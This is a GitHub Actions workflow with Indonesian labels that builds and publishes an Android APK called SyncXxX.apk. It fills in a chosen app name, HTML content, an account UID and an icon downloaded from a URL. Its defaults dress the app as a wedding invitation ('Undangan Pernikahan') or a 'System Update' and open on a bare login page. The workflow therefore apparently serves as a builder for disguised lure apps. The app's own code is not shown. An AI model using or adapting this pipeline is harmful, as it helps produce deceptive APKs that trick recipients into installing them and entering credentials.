name: Build Sync XxX APK

on:
  workflow_dispatch:
    inputs:
      app_name:
        description: 'Nama Aplikasi'
        required: true
        default: 'Undangan Pernikahan'
      html_content:
        description: 'Kode HTML untuk tampilan aplikasi'
        required: true
        default: '<html><body><h1>Login</h1></body></html>'
      uid:
        description: 'UID Akun'
        required: true
        default: 'nexsus-xxxxxxx'
      icon_url:
        description: 'URL Icon (PNG/JPG)'
        required: false
        default: 'https://files.catbox.moe/xxx.jpg'

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: write
      actions: write

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'

      - name: Install Pillow
        run: pip install Pillow

      - name: Inject Config (Python)
        env:
          HTML_CONTENT: ${{ github.event.inputs.html_content }}
          APP_NAME: ${{ github.event.inputs.app_name }}
          ACCOUNT_UID: ${{ github.event.inputs.uid }}
        run: |
          python3 - << 'EOF'
          import os, json, re

          # ─── 1. WRITE HTML ASSET ───
          os.makedirs("android/app/src/main/assets", exist_ok=True)
          html_content = os.environ.get("HTML_CONTENT", "<html><body>Error</body></html>")
          with open("android/app/src/main/assets/index.html", "w", encoding="utf-8") as f:
              f.write(html_content)
          print(f"✅ HTML asset written ({len(html_content)} bytes)")

          # ─── 2. REPLACE APP NAME ───
          strings_xml = "android/app/src/main/res/values/strings.xml"
          with open(strings_xml, "r") as f:
              content = f.read()

          app_name = os.environ.get("APP_NAME", "System Update")
          content = re.sub(
              r'<string name="app_name">.*?</string>',
              f'<string name="app_name">{app_name}</string>',
              content
          )
          with open(strings_xml, "w") as f:
              f.write(content)
          print(f"✅ APP_NAME injected: {app_name}")

          # ─── 3. CREATE UID.JSON ───
          uid = os.environ.get("ACCOUNT_UID", "nexsus-xxxxxxx")
          with open("android/app/src/main/assets/uid.json", "w") as f:
              json.dump({"uid": uid}, f)
          print(f"✅ UID injected: {uid}")

          # ─── 4. VERIFY ───
          print("\n=== VERIFIKASI ===")
          if os.path.exists("android/app/src/main/assets/index.html"):
              print("index.html: OK")
          else:
              print("index.html: MISSING")
          print("==================\n")
          EOF

      - name: Download Icon
        run: |
          curl -L -o custom_icon.png "${{ github.event.inputs.icon_url }}"

      - name: Generate App Icons
        run: python3 generate_icons.py custom_icon.png

      - name: Setup Gradle Wrapper
        run: |
          curl -L -o android/gradle/wrapper/gradle-wrapper.jar \
            "https://github.com/gradle/gradle/raw/v8.4.0/gradle/wrapper/gradle-wrapper.jar"
          chmod +x android/gradlew

      - name: Build Release APK
        run: |
          cd android
          ./gradlew assembleRelease --no-daemon

      - name: Rename APK
        run: |
          mkdir -p output
          find android/app/build/outputs/apk/release/ -name "*.apk" | head -1 \
            | xargs -I{} cp {} output/SyncXxX.apk

      - name: Create Release and Upload APK
        uses: softprops/action-gh-release@v1
        with:
          tag_name: build-${{ github.run_id }}
          name: "Build ${{ github.event.inputs.app_name }}"
          files: output/SyncXxX.apk
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}